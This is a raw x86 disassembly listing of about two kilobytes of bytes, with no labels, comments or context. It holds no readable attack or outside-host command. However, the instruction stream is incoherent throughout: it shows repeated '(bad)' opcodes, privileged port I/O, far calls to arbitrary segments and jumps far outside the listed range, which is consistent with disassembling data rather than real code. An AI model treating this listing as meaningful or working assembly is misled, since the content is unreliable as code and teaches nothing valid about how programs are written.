  411f81:	mov    cl,BYTE PTR [ebp-0x66]
  411f84:	in     al,0x9f
  411f86:	ja     0x411fca
  411f88:	sbb    BYTE PTR [edx+0x59cab78],dl
  411f8e:	shr    cl,1
  411f90:	gs clc 
  411f92:	mov    ebx,0xa4bc46c2
  411f97:	fsubr  DWORD PTR [edx+0x6a3d3c29]
  411f9d:	outs   dx,BYTE PTR ds:[esi]
  411f9e:	cwde   
  411f9f:	scas   al,BYTE PTR es:[edi]
  411fa0:	push   0x7fc70f2b
  411fa5:	enter  0xf9c4,0x24
  411fa9:	push   esi
  411faa:	mov    ebp,0x5c3d0983
  411faf:	pop    es
  411fb0:	push   ebp
  411fb1:	mov    ecx,0x3324a353
  411fb6:	push   eax
  411fb7:	jp     0x411f42
  411fb9:	sti    
  411fba:	sbb    al,0xb7
  411fbc:	test   BYTE PTR [ebp+ebx*4+0xd26f776],al
  411fc3:	jbe    0x509e1e26
  411fc9:	ins    DWORD PTR es:[edi],dx
  411fca:	adc    ecx,DWORD PTR [edi+0x37]
  411fcd:	mov    ebx,0x1b09e90b
  411fd2:	dec    ecx
  411fd3:	(bad)  
  411fd4:	pop    ebp
  411fd5:	or     BYTE PTR [ebx+0x4d46292f],bl
  411fdb:	out    dx,al
  411fdc:	lea    ebp,[edi]
  411fde:	rcl    DWORD PTR [eax+0x30],cl
  411fe1:	mov    al,0xec
  411fe3:	mov    ah,0xfa
  411fe5:	outs   dx,DWORD PTR ds:[esi]
  411fe6:	xchg   esi,eax
  411fe7:	sub    cl,BYTE PTR [esi]
  411fe9:	ret    0xd7de
  411fec:	and    DWORD PTR [ebx-0x6ca6162f],ecx
  411ff2:	jbe    0x411f96
  411ff4:	sub    al,0x7c
  411ff6:	mov    esi,0x655c4988
  411ffb:	je     0x411fbc
  411ffd:	lods   eax,DWORD PTR ds:[esi]
  411ffe:	inc    edx
  411fff:	ret    0x69fa
  412002:	(bad)  
  412003:	fsubr  st(3),st
  412005:	call   0xdc94:0x204cdbf
  41200c:	xor    ah,BYTE PTR [edi-0x35cab14e]
  412012:	pop    edx
  412013:	pop    ebp
  412014:	mov    eax,ds:0x657baca0
  412019:	lahf   
  41201a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41201b:	fdivr  QWORD PTR ds:0xc65fd79c
  412021:	test   eax,0x2c17dc5e
  412026:	fist   DWORD PTR [esi]
  412028:	push   ss
  412029:	xor    al,0x2f
  41202b:	daa    
  41202c:	xchg   esp,eax
  41202d:	sahf   
  41202e:	ror    DWORD PTR [ecx+0x47b7d03f],1
  412034:	jg     0x41201d
  412036:	mov    BYTE PTR [edi],0xf1
  412039:	fs push 0xffffffde
  41203c:	test   ebx,eax
  41203e:	lods   al,BYTE PTR ds:[esi]
  41203f:	push   esi
  412040:	mov    esp,0xf759936c
  412045:	mov    edx,0x698aee0
  41204a:	bound  edi,QWORD PTR [eax-0x6ad8dc64]
  412050:	int3   
  412051:	inc    edi
  412052:	add    eax,0x36d4062
  412057:	clc    
  412058:	adc    al,0x2f
  41205a:	pop    ebp
  41205b:	fst    DWORD PTR [ebp+0x3ae65a8]
  412061:	pop    edi
  412062:	out    dx,al
  412063:	xor    ebp,ecx
  412065:	cli    
  412066:	or     dh,BYTE PTR [ebx-0x1f]
  412069:	ins    DWORD PTR es:[edi],dx
  41206a:	(bad)  
  41206b:	sar    BYTE PTR [edi-0x1742bd0],1
  412071:	pusha  
  412072:	imul   ecx,DWORD PTR [edx-0x527749b5],0x66
  412079:	stos   DWORD PTR es:[edi],eax
  41207a:	clc    
  41207b:	and    BYTE PTR [ecx+0xa65bafd],0x98
  412082:	call   edx
  412084:	jmp    0x54ed0991
  412089:	jno    0x4120f9
  41208b:	pop    ecx
  41208c:	mov    eax,0xb487b870
  412091:	sub    dh,al
  412093:	idiv   DWORD PTR [esi-0x33]
  412096:	jmp    0xfc75cdeb
  41209b:	xchg   esp,esp
  41209d:	icebp  
  41209e:	push   ds
  41209f:	xchg   edx,eax
  4120a0:	data16 (bad) 
  4120a2:	jmp    0xa03e039d
  4120a7:	or     DWORD PTR [eax-0x12],esp
  4120aa:	jne    0x412101
  4120ac:	cmp    eax,0x239afbc4
  4120b1:	xor    BYTE PTR [ebx-0x80],bh
  4120b4:	ror    edi,0x6e
  4120b7:	mov    esp,0xe4147891
  4120bc:	loopne 0x4120de
  4120be:	mov    eax,0xc0f15d02
  4120c3:	shl    BYTE PTR [edi],cl
  4120c5:	or     al,0x46
  4120c7:	cs call 0x983d69d0
  4120cd:	arpl   WORD PTR [ebx+0x4c],si
  4120d0:	mov    ch,BYTE PTR [ebx]
  4120d2:	ins    DWORD PTR es:[edi],dx
  4120d3:	mov    ds:0x707fda57,al
  4120d8:	mov    al,0x23
  4120da:	dec    esp
  4120db:	bound  edx,QWORD PTR [edi+esi*2+0x2e1d76e7]
  4120e2:	ror    BYTE PTR [ebx-0x630369b3],cl
  4120e8:	call   0x6853:0xb385c1d2
  4120ef:	fnstcw WORD PTR [edi]
  4120f1:	(bad)  
  4120f3:	lock gs out dx,al
  4120f6:	push   0x7e
  4120f8:	mov    dl,0x3d
  4120fa:	inc    ebp
  4120fb:	ret    
  4120fc:	xchg   BYTE PTR [esi-0x5f],dh
  4120ff:	outs   dx,BYTE PTR ds:[esi]
  412100:	or     al,0x74
  412103:	dec    edx
  412104:	fcom   QWORD PTR [ebp-0x59c23215]
  41210a:	pusha  
  41210b:	mov    WORD PTR [esi-0x58582d78],?
  412111:	outs   dx,DWORD PTR ds:[esi]
  412112:	enter  0xdc57,0x8
  412116:	in     eax,dx
  412117:	ret    
  412118:	jge    0x41218b
  41211a:	sbb    DWORD PTR [ecx-0x257370b1],ebx
  412120:	adc    al,BYTE PTR [ebx]
  412122:	mov    eax,0x9c9e66dc
  412127:	adc    eax,0xf986c9c7
  41212c:	push   ds
  41212d:	int    0xc
  41212f:	(bad)  
  412130:	out    dx,al
  412131:	adc    ecx,edi
  412133:	loope  0x412163
  412135:	xchg   ebx,eax
  412136:	or     eax,0xd4fdeeb7
  41213b:	faddp  st(1),st
  41213d:	lds    esp,FWORD PTR [ebx+0x4b95dc67]
  412143:	pop    ds
  412144:	inc    esp
  412145:	cli    
  412146:	jb     0x4121b0
  412148:	fist   WORD PTR [ebx+0x2d]
  41214b:	les    edx,FWORD PTR [eax+eiz*4]
  41214e:	fmul   QWORD PTR [bp+0x12e5]
  412153:	mov    esi,0x7aaa4139
  412158:	mov    esi,0x42cab0b2
  41215d:	call   0x1ee6:0xe886a7ae
  412164:	push   edx
  412165:	(bad)  [ecx+0x40]
  412168:	pushf  
  412169:	nop
  41216a:	imul   DWORD PTR [edi+0x79]
  41216d:	(bad)  
  41216e:	(bad)  
  41216f:	enter  0x5fa3,0x61
  412173:	adc    BYTE PTR [eax-0x41],dl
  412176:	outs   dx,DWORD PTR ds:[esi]
  412177:	mov    ah,0x95
  412179:	pop    ds
  41217a:	inc    eax
  41217b:	mov    al,0x8a
  41217d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41217e:	out    dx,eax
  41217f:	cwde   
  412180:	jmp    0x4121f1
  412182:	pop    edx
  412183:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412184:	shl    edi,0xc6
  412187:	clc    
  412188:	cmc    
  412189:	in     eax,dx
  41218a:	lds    esi,FWORD PTR [ecx+0x4f4e9e4d]
  412190:	sub    BYTE PTR [ebp+0x68de0ab9],ch
  412196:	pop    esi
  412197:	lods   al,BYTE PTR ds:[esi]
  412198:	sub    eax,0x6df45eed
  41219d:	test   ecx,esp
  41219f:	pop    ds
  4121a0:	enter  0x81a,0xb1
  4121a4:	cdq    
  4121a5:	xchg   esi,eax
  4121a6:	shl    BYTE PTR [ebp+0x6e],1
  4121a9:	enter  0x8fec,0x35
  4121ad:	leave  
  4121ae:	pop    esi
  4121af:	cmp    BYTE PTR [ecx],al
  4121b1:	hlt    
  4121b2:	cmp    DWORD PTR [esi-0x44],ecx
  4121b5:	sahf   
  4121b6:	sub    al,dl
  4121b8:	inc    BYTE PTR [ecx-0x430e9544]
  4121be:	fistp  DWORD PTR [edi-0x347ba2f]
  4121c4:	shl    DWORD PTR [ebp+0x6f],cl
  4121c7:	ror    eax,1
  4121c9:	add    eax,0xbebfdd2
  4121ce:	sub    al,0x8e
  4121d0:	fwait
  4121d1:	dec    eax
  4121d2:	sbb    DWORD PTR [esi+ebp*4-0xc42145d],eax
  4121d9:	mov    eax,ds:0x79618823
  4121de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121df:	pop    es
  4121e0:	mov    eax,0x2f1c280a
  4121e5:	lahf   
  4121e6:	pushf  
  4121e7:	test   eax,0x16842796
  4121ec:	or     bl,BYTE PTR [ecx+0x1f]
  4121ef:	inc    edi
  4121f0:	daa    
  4121f1:	sbb    al,al
  4121f3:	sbb    eax,0x20e8e5b8
  4121f8:	mov    ch,0xe8
  4121fa:	mov    ch,0x20
  4121fc:	and    ebp,DWORD PTR [ecx+0x2ff1f753]
  412202:	call   DWORD PTR [ecx-0x74]
  412205:	sbb    bl,BYTE PTR gs:[edx]
  412208:	(bad)  
  41220a:	shl    bl,cl
  41220c:	out    0xf,al
  41220e:	inc    edx
  41220f:	ins    BYTE PTR es:[edi],dx
  412210:	inc    esp
  412211:	out    0x87,al
  412213:	sbb    eax,0xe2f80960
  412218:	aad    0xb5
  41221a:	fbstp  TBYTE PTR [esi]
  41221c:	pushf  
  41221d:	repnz rcl al,1
  412220:	ss mov dh,0x2e
  412223:	pop    ecx
  412224:	push   es
  412225:	rcl    BYTE PTR [ebx+0x2ab41e07],cl
  41222b:	cmp    eax,DWORD PTR [eax-0x63]
  41222e:	test   BYTE PTR [ecx+0x19],al
  412231:	push   0x1eb92cae
  412236:	jmp    0x5603bd5f
  41223b:	cwde   
  41223c:	mov    eax,ds:0xafd22fde
  412241:	and    al,0xfe
  412243:	pop    esp
  412244:	xchg   edx,eax
  412245:	bound  edx,QWORD PTR [esi]
  412247:	(bad)  
  412248:	mov    edx,0x4cd6e522
  41224d:	mov    al,ds:0x8dcf6cbf
  412252:	ja     0x4121d9
  412254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412255:	addr16 enter 0x2a78,0x6f
  41225a:	nop
  41225b:	push   0x6d4fd579
  412260:	test   al,0xe0
  412262:	or     dh,ch
  412264:	xor    BYTE PTR [ecx],cl
  412266:	add    DWORD PTR [esi-0x70],ecx
  412269:	icebp  
  41226a:	xchg   esi,eax
  41226b:	inc    esi
  41226c:	out    0xed,eax
  41226e:	repnz sbb al,0xdd
  412271:	and    ecx,ecx
  412273:	test   al,0xc6
  412275:	scas   eax,DWORD PTR es:[edi]
  412276:	inc    ecx
  412277:	test   eax,0xc2dd25df
  41227c:	dec    esp
  41227d:	into   
  41227e:	arpl   WORD PTR [esi+ecx*8-0x3f5df9c3],di
  412285:	xchg   ebp,eax
  412286:	add    eax,DWORD PTR ds:0xc0d91006
  41228c:	arpl   WORD PTR [esi+0x41bfec03],cx
  412292:	xlat   BYTE PTR ds:[ebx]
  412293:	sub    bh,BYTE PTR [esi]
  412295:	mov    edx,0xae733d53
  41229a:	in     al,dx
  41229b:	xor    ah,BYTE PTR [edi+0x688c044e]
  4122a1:	jmp    0x37ae6cf9
  4122a6:	icebp  
  4122a7:	lods   al,BYTE PTR ds:[esi]
  4122a8:	sbb    DWORD PTR [ecx-0x3e34b4b8],esi
  4122ae:	call   0x378caf31
  4122b3:	dec    ecx
  4122b4:	adc    al,0x46
  4122b6:	jge    0x4122c8
  4122b8:	ins    BYTE PTR es:[edi],dx
  4122b9:	and    edx,DWORD PTR [edx+0x24]
  4122bc:	jbe    0x4122a0
  4122be:	push   ecx
  4122bf:	cli    
  4122c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122c1:	dec    edi
  4122c2:	or     ah,cl
  4122c4:	adc    ah,0x91
  4122c7:	cwde   
  4122c8:	mov    bl,0x6e
  4122ca:	pop    ebx
  4122cb:	fild   QWORD PTR [edx+0x3170c80c]
  4122d1:	lods   eax,DWORD PTR ds:[esi]
  4122d2:	or     dl,bh
  4122d4:	shr    DWORD PTR [edi-0x75],cl
  4122d7:	push   eax
  4122d8:	xchg   edi,eax
  4122d9:	jmp    0x7d1832a
  4122de:	dec    ebp
  4122df:	pop    edi
  4122e0:	sub    ah,BYTE PTR [eax-0x19]
  4122e3:	dec    edx
  4122e4:	cmp    DWORD PTR ds:0x4b802c4d,eax
  4122ea:	mov    cl,0x46
  4122ec:	cmp    BYTE PTR [ecx-0x61],al
  4122ef:	add    dh,ch
  4122f1:	repz call 0x8aaa4218
  4122f7:	pop    ds
  4122f8:	div    ch
  4122fa:	dec    esp
  4122fb:	js     0x412297
  4122fd:	outs   dx,DWORD PTR ds:[esi]
  4122fe:	jmp    0x4122f6
  412300:	int    0x8d
  412302:	push   ecx
  412303:	sub    edx,DWORD PTR [ebx+0x3f32ef47]
  412309:	pop    es
  41230a:	sbb    al,0xa
  41230c:	cwde   
  41230d:	out    0x71,al
  41230f:	js     0x412352
  412311:	addr16 sbb BYTE PTR [bp+di-0x4342],ah
  412317:	mov    ?,ebp
  412319:	xchg   ecx,eax
  41231a:	mov    esp,0xb6a47104
  41231f:	mov    dh,0xf1
  412321:	sbb    ebp,DWORD PTR [esi-0x6f]
  412324:	push   esp
  412325:	pop    esp
  412326:	jle    0x412361
  412328:	fdivp  st(5),st
  41232a:	scas   al,BYTE PTR es:[edi]
  41232b:	imul   eax,DWORD PTR [ebx+0x6f],0x4f
  41232f:	dec    esp
  412330:	sahf   
  412331:	jge    0x412356
  412333:	xor    al,0x4b
  412335:	dec    edx
  412336:	pop    ds
  412337:	jne    0x41239b
  412339:	or     BYTE PTR [edx+0x72],bl
  41233c:	aaa    
  41233d:	pop    ds
  41233e:	icebp  
  41233f:	sub    eax,0xeb158e96
  412344:	fild   WORD PTR [ebp+0x5c]
  412347:	aas    
  412348:	bound  edi,QWORD PTR [ebx-0x63]
  41234b:	dec    edi
  41234c:	mov    ds:0x23602592,eax
  412351:	pop    ecx
  412352:	in     al,dx
  412353:	std    
  412354:	arpl   di,bx
  412356:	ret    
  412357:	push   ss
  412358:	in     al,dx
  412359:	mov    ch,0x4e
  41235b:	test   eax,0xef75356f
  412360:	retf   
  412361:	mov    esi,0xaed848d0
  412366:	mov    ebx,0x4a479a17
  41236b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41236c:	outs   dx,DWORD PTR ds:[esi]
  41236d:	jmp    ecx
  41236f:	test   BYTE PTR [edi-0x3ba9534],ch
  412375:	push   ss
  412376:	into   
  412377:	cwde   
  412378:	sbb    BYTE PTR [ebp+0x5c],ah
  41237b:	bound  ecx,QWORD PTR [edi+0x7537074a]
  412381:	mov    BYTE PTR [edx-0x7d2aedb0],0xc4
  412388:	jp     0x41231c
  41238a:	adc    al,0xfe
  41238c:	and    eax,0x757c5be8
  412391:	les    edi,FWORD PTR [ebx]
  412393:	sbb    al,0xce
  412395:	dec    ecx
  412396:	push   esp
  412397:	jp     0x41231f
  412399:	or     BYTE PTR [esi],dl
  41239b:	sbb    dl,cl
  41239d:	xchg   BYTE PTR [edi-0x18],dh
  4123a0:	inc    edi
  4123a1:	sahf   
  4123a2:	loop   0x4123cd
  4123a4:	rol    ebx,cl
  4123a6:	es cli 
  4123a8:	sub    ah,BYTE PTR [esp+ebp*8+0x639f8647]
  4123af:	push   ecx
  4123b0:	mov    bh,0x5
  4123b2:	jmp    0x4123cc
  4123b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123b5:	or     BYTE PTR [eax-0x1065e821],0x26
  4123bc:	xor    BYTE PTR [edi+0x55ecf082],ah
  4123c2:	adc    al,0xe4
  4123c4:	sahf   
  4123c5:	lods   al,BYTE PTR ds:[esi]
  4123c6:	out    dx,al
  4123c7:	cdq    
  4123c8:	in     eax,0xd3
  4123ca:	loope  0x412420
  4123cc:	xor    BYTE PTR [edi+eax*2-0x581e384e],ah
  4123d3:	mov    edx,0x6afceab8
  4123d8:	stc    
  4123d9:	jno    0x4123bb
  4123db:	cdq    
  4123dc:	mov    esp,0x3375348b
  4123e1:	ins    DWORD PTR es:[edi],dx
  4123e2:	jmp    0x4123b4
  4123e4:	inc    edi
  4123e5:	(bad)  
  4123e6:	repz mov ?,WORD PTR [edi+0x4c]
  4123ea:	les    esi,FWORD PTR [ebx-0x462f1f2e]
  4123f0:	sbb    DWORD PTR [edi+0x72d1a104],esp
  4123f6:	inc    edx
  4123f7:	adc    BYTE PTR [esi+0x4b],cl
  4123fa:	push   eax
  4123fb:	mov    eax,ds:0x554ace0c
  412400:	ret    0x4a45
  412403:	(bad)  
  412404:	aam    0xdd
  412406:	ds mov esp,0xd27064f8
  41240c:	adc    DWORD PTR [eax],eax
  41240e:	jmp    0xfd5b175a
  412413:	out    dx,eax
  412414:	(bad)  
  412415:	mov    ah,0x7e
  412417:	imul   esi,DWORD PTR [eax],0xffffffe0
  41241a:	test   BYTE PTR [esp+ebp*8],ch
  41241d:	(bad)  [ebx]
  41241f:	ja     0x412470
  412421:	cdq    
  412422:	dec    ecx
  412423:	test   BYTE PTR [eax+eiz*8],dl
  412426:	cli    
  412427:	sbb    BYTE PTR [eax-0x721d2120],bh
  41242d:	loop   0x4123de
  41242f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412430:	xlat   BYTE PTR ds:[ebx]
  412431:	sub    edx,DWORD PTR [ebx]
  412433:	push   edx
  412434:	(bad)  
  412435:	xchg   ebp,eax
  412436:	ror    edi,1
  412438:	push   0x58ca90d9
  41243d:	inc    esp
  41243e:	fmul   QWORD PTR [ebx*8+0x65475b5b]
  412445:	bound  ebp,QWORD PTR [edx+0x2]
  412448:	pop    edi
  412449:	mov    ebp,0xee8d512
  41244e:	xor    cl,ah
  412450:	xor    ebx,DWORD PTR [eax+0x72]
  412453:	scas   al,BYTE PTR es:[edi]
  412454:	gs ret 0xd9d0
  412458:	jge    0x412414
  41245a:	mov    bl,0x83
  41245c:	inc    ecx
  41245d:	test   al,0xd8
  41245f:	jae    0x41241a
  412461:	pop    esi
  412462:	jo     0x41244e
  412464:	xor    BYTE PTR [ebp-0x4d],ch
  412467:	push   edi
  412468:	fs in  al,dx
  41246a:	adc    BYTE PTR ds:0x47bd4a1c,ah
  412470:	mov    dh,BYTE PTR [ebx+0x52]
  412473:	js     0x4124bb
  412475:	imul   BYTE PTR [edi-0x37256d63]
  41247b:	push   esi
  41247c:	sbb    al,0xd1
  41247e:	cld    
  41247f:	push   0xffffff86
  412481:	adc    BYTE PTR [edi],ch
  412483:	stos   DWORD PTR es:[edi],eax
  412484:	mov    al,0x51
  412486:	push   edx
  412487:	dec    ebx
  412488:	rcl    DWORD PTR [esi+0x7a],cl
  41248b:	xor    al,0x50
  41248d:	and    edx,DWORD PTR [edx]
  41248f:	fild   QWORD PTR [eax+0x71]
  412492:	mov    ecx,0x6e057f0f
  412497:	ins    DWORD PTR es:[edi],dx
  412498:	pusha  
  412499:	dec    esi
  41249a:	fwait
  41249b:	xor    cl,BYTE PTR [edx]
  41249d:	inc    ebp
  41249e:	sbb    DWORD PTR [ebx-0x2d],0xfffffff4
  4124a2:	pop    edi
  4124a3:	mov    ebx,0x6b19d92
  4124a8:	fs rol ch,0x4a
  4124ac:	stos   BYTE PTR es:[edi],al
  4124ad:	ficom  DWORD PTR [edi]
  4124af:	xor    BYTE PTR [ecx-0x4ccf51ec],dl
  4124b5:	mov    eax,ds:0xa5e12f33
  4124ba:	cld    
  4124bb:	fcomp  DWORD PTR [ebx-0x6e]
  4124be:	pop    edi
  4124bf:	inc    ebp
  4124c0:	push   esp
  4124c1:	add    ch,BYTE PTR [ecx+0x536db67f]
  4124c7:	cwde   
  4124c8:	outs   dx,DWORD PTR ds:[esi]
  4124c9:	sub    eax,0x5fd52734
  4124ce:	jo     0x4124ad
  4124d0:	lds    ebx,FWORD PTR [ebx]
  4124d2:	or     eax,0x8f55063d
  4124d7:	xor    esi,DWORD PTR [edx+0x4aea7412]
  4124dd:	sbb    bl,bh
  4124df:	sti    
  4124e0:	loop   0x4124ef
  4124e2:	call   0x883:0x9c2f10d0
  4124e9:	pop    edx
  4124ea:	xor    BYTE PTR [ecx-0x21],bl
  4124ed:	fsub   DWORD PTR [esi]
  4124ef:	fwait
  4124f0:	mov    ebx,0xf566610c
  4124f5:	fiadd  WORD PTR [ecx+0x23]
  4124f8:	pushf  
  4124f9:	std    
  4124fa:	add    eax,0xffffffa0
  4124fd:	pusha  
  4124fe:	jmp    0x4124cd
  412500:	icebp  
  412501:	push   ebp
  412502:	jbe    0x412498
  412504:	popf   
  412505:	int3   
  412506:	pop    esi
  412507:	call   0xd002:0xe0ed0823
  41250e:	fld    DWORD PTR [esi-0x2f9380d7]
  412514:	ror    BYTE PTR [edi-0x43],cl
  412517:	pop    esi
  412518:	jae    0x412591
  41251a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41251b:	cmp    ebp,DWORD PTR [edi]
  41251d:	xchg   esi,eax
  41251e:	ds pop esp
  412520:	pop    esi
  412521:	popa   
  412522:	push   cs
  412523:	stos   DWORD PTR es:[edi],eax
  412524:	pop    ss
  412525:	inc    edx
  412526:	rol    BYTE PTR [ebp+esi*1-0xb6bb0a6],0x72
  41252e:	xchg   dx,ax
  412530:	jge    0x41253c
  412532:	daa    
  412533:	(bad)  
  412534:	cmp    al,0x3f
  412536:	shr    ecx,cl
  412538:	xchg   DWORD PTR [eax+0x622fa066],esp
  41253e:	out    dx,al
  41253f:	pop    ss
  412540:	or     ch,bl
  412542:	jns    0x412563
  412544:	lea    edi,[esi]
  412546:	mov    WORD PTR [ebx-0x29767f70],fs
  41254c:	(bad)  
  41254d:	jp     0x412525
  41254f:	xlat   BYTE PTR ds:[ebx]
  412550:	cmc    
  412551:	xor    esp,esi
  412553:	aam    0xe7
  412555:	xchg   ebx,eax
  412556:	xchg   DWORD PTR [edx-0x3886620e],edi
  41255c:	das    
  41255d:	push   edi
  41255e:	adc    dh,BYTE PTR [ebx-0x38]
  412561:	push   ebx
  412562:	adc    dl,BYTE PTR [ecx+0x17]
  412565:	cs cs push ebp
  412568:	int    0x5f
  41256a:	push   eax
  41256b:	dec    esi
  41256c:	cmp    BYTE PTR [ecx+0x1b6f2333],cl
  412572:	data16 jae 0x4125a9
  412575:	stc    
  412576:	out    0xf6,al
  412578:	mov    esp,0x428da942
  41257d:	xchg   edi,eax
  41257e:	or     cl,cl
  412580:	addr16 mov al,ds:0xd353
  412584:	jno    0x4125bd
  412586:	in     al,0x86
  412588:	sbb    DWORD PTR [ebx+0x24],0xff32d63f
  41258f:	gs jp  0x41260a
  412592:	adc    al,0x9
  412595:	push   es
  412596:	(bad)  
  412597:	sar    DWORD PTR [ebp+0x21d44eab],cl
  41259d:	push   edx
  41259e:	adc    eax,0xb049cf00
  4125a3:	cmc    
  4125a4:	jp     0x41257c
  4125a6:	js     0x41257d
  4125a8:	test   BYTE PTR [ecx],dh
  4125aa:	hlt    
  4125ab:	lods   al,BYTE PTR ds:[esi]
  4125ac:	test   eax,0x9783e9cc
  4125b1:	or     BYTE PTR [ebp+0x287eefbe],bl
  4125b7:	mov    BYTE PTR cs:[edi+0x5d],dh
  4125bb:	push   ss
  4125bc:	pop    ecx
  4125bd:	pop    ebx
  4125be:	push   ds
  4125bf:	jnp    0x41257a
  4125c1:	xchg   DWORD PTR [eax+eiz*8-0x51],ecx
  4125c5:	dec    eax
  4125c6:	mov    DWORD PTR [ecx+0x8],edi
  4125c9:	inc    edx
  4125ca:	cmp    bl,dh
  4125cc:	js     0x4125e6
  4125ce:	cmp    esp,esi
  4125d0:	add    DWORD PTR ds:[edx+0x9965e9],esp
  4125d7:	ins    BYTE PTR es:[edi],dx
  4125d8:	mov    dl,0x50
  4125da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125db:	ror    BYTE PTR [edx+0x5eaf270a],1
  4125e1:	push   ds
  4125e2:	cmp    BYTE PTR [edi+0x3d],dl
  4125e5:	sub    ebx,edx
  4125e7:	jmp    0x4125de
  4125e9:	scas   al,BYTE PTR es:[edi]
  4125ea:	xchg   esi,eax
  4125eb:	fcomp  st(0)
  4125ed:	into   
  4125ee:	mov    eax,0x1f707013
  4125f3:	fs cmc 
  4125f5:	repz xor dl,BYTE PTR [esi+0x7a4dfedc]
  4125fc:	not    DWORD PTR [ebx+0x47b62deb]
  412602:	dec    esi
  412603:	jle    0x412605
  412605:	push   eax
  412606:	lock call 0xc922010c
  41260c:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41260e:	ins    DWORD PTR es:[edi],dx
  41260f:	mov    esi,0x41ae890c
  412614:	sub    al,0xa6
  412616:	jmp    0x95255230
  41261b:	out    dx,al
  41261c:	ret    0x1093
  41261f:	mov    dl,0xb0
  412621:	fiadd  DWORD PTR [ebx+0xe]
  412624:	and    al,dl
  412626:	shr    BYTE PTR [ecx-0x47],0x26
  41262a:	and    al,0x76
  41262c:	pop    edi
  41262d:	push   ebx
  41262e:	mov    gs,WORD PTR [esi+0x62]
  412631:	lock les edi,FWORD PTR [esi]
  412634:	dec    ecx
  412635:	mov    eax,ds:0xab898833
  41263a:	fst    DWORD PTR [esi+0x54]
  41263e:	or     BYTE PTR [edi-0x5f968893],cl
  412644:	enter  0x3b10,0x78
  412648:	in     al,dx
  412649:	retf   0xc85a
  41264c:	pop    ebx
  41264d:	push   es
  41264e:	mov    ecx,ebx
  412650:	mov    edx,DWORD PTR ds:0x9dddd596
  412656:	pop    eax
  412657:	push   eax
  412658:	mov    ds:0x60ebf4da,al
  41265d:	ret    
  41265e:	in     eax,dx
  41265f:	out    dx,al
  412660:	or     BYTE PTR [esi+0x2e313464],cl
  412666:	shr    BYTE PTR [eax+0x3b],cl
  412669:	shr    BYTE PTR [edi+edi*1],1
  41266c:	mov    ecx,0x58051ae4
  412671:	rol    DWORD PTR [ecx+0x147dcaec],1
  412677:	ja     0x412693
  412679:	xor    ebp,DWORD PTR [edi-0x62]
  41267c:	mov    ebx,0xb7aebdc6
  412681:	(bad)  
  412683:	mov    DWORD PTR [edi-0x10],edx
  412686:	sbb    al,0xec
  412688:	adc    BYTE PTR [ecx],ch
  41268a:	(bad)  
  41268b:	sti    
  41268c:	fidiv  WORD PTR [esi+eiz*2+0x3b1e8eab]
  412693:	sub    esp,eax
  412695:	sbb    DWORD PTR [ebx-0x41600b9c],ebp
  41269b:	jp     0x4126b5
  41269d:	mov    bl,0x69
  41269f:	fsubp  st(4),st
  4126a1:	sbb    DWORD PTR [edx],eax
  4126a3:	lods   eax,DWORD PTR ds:[esi]
  4126a4:	leave  
  4126a5:	add    eax,0x63499ec0
  4126aa:	dec    eax
  4126ab:	in     al,dx
  4126ac:	or     BYTE PTR [ebx+0x25],dl
  4126af:	dec    esi
  4126b0:	jmp    0x6718ce37
  4126b5:	ins    DWORD PTR es:[edi],dx
  4126b6:	pop    edx
  4126b7:	sbb    DWORD PTR [edi+0xc3187e2],edx
  4126bd:	lods   eax,DWORD PTR ds:[esi]
  4126be:	int3   
  4126bf:	shr    DWORD PTR [esi],cl
  4126c1:	test   BYTE PTR [eax+edi*4],bh
  4126c4:	or     eax,0xf081e450
  4126c9:	sbb    cl,BYTE PTR [esp+edx*8]
  4126cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126cd:	sar    BYTE PTR [ebp+ebx*8+0x3a59e18a],cl
  4126d4:	out    0x35,al
  4126d6:	ins    BYTE PTR es:[edi],dx
  4126d7:	jae    0x4126b5
  4126d9:	dec    eax
  4126da:	jg     0x41265e
  4126dc:	fwait
  4126dd:	jo     0x4126ee
  4126df:	ss push ss
  4126e1:	mov    esi,edi
  4126e3:	sbb    esi,DWORD PTR [eiz*2+0x1b844b91]
  4126ea:	arpl   WORD PTR [eax+0x14],sp
  4126ed:	shl    cl,cl
  4126ef:	pop    ebx
  4126f0:	gs inc ecx
  4126f2:	or     bl,BYTE PTR [ebp-0x28]
  4126f5:	(bad)  
  4126f6:	jg     0x4126a6
  4126f8:	mov    ah,0xde
  4126fa:	xor    DWORD PTR ds:0xa4b277d3,ebp
  412700:	mov    eax,0xf0894e8f
  412705:	mov    al,ds:0xe41b78a
  41270a:	mov    edi,0xc99ac908
  41270f:	out    0x28,eax
  412711:	cdq    
  412712:	add    DWORD PTR [ebx+0x13],ebp
  412715:	hlt    
  412716:	sbb    al,0xe8
  412718:	jmp    0xfa1c4df7
  41271d:	cwde   
  41271e:	cdq    
  41271f:	mov    ebx,0xa50315cb
  412724:	mov    ds:0x8ed57432,eax
  412729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41272a:	fmulp  st(6),st
  41272c:	add    dl,BYTE PTR ds:0xcfa74cd4
  412732:	outs   dx,BYTE PTR ds:[esi]
  412733:	int3   
  412734:	and    BYTE PTR ds:0x9e6629d4,al
  41273a:	xchg   BYTE PTR [edi+0x70f89633],dl
  412740:	das    
  412741:	mov    esp,0x576b469c
  412746:	and    eax,ebx
  412748:	sub    al,BYTE PTR ds:[edi]
  41274b:	pop    esp
  41274c:	pushf  
  41274d:	lock dec ecx
  41274f:	pushf  
  412750:	jmp    0x8b35c8b3
  412755:	cli    
  412756:	mov    ah,0x76
  412758:	fild   WORD PTR [edi]
  41275a:	and    eax,0x56bfd46
  41275f:	call   0x58bda781
  412764:	jae    0x412700
  412766:	xor    BYTE PTR [edi-0x5f0e7b1c],bl
  41276c:	ins    BYTE PTR es:[edi],dx
  41276d:	xchg   dx,ax
  41276f:	add    bl,BYTE PTR [ebp+0x74]
  412772:	or     al,0x55
